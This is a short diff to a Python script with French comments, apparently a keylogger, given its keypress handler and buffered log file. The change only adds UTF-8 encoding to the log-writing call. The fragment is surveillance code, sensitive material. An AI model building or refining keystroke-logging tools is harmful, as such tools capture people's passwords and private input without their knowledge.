@@ -6,7 +6,7 @@ BUFFER_SIZE = 20 # Nombre de caractères à stocker avant d'écrire dans le fich
 
 def write_to_file(data): # Ecrire dans le fichier
     if data:
-        with open(log_file, "a") as f:
+        with open(log_file, "a", encoding="utf-8") as f:
             f.write(data)
 
 def on_press(key):
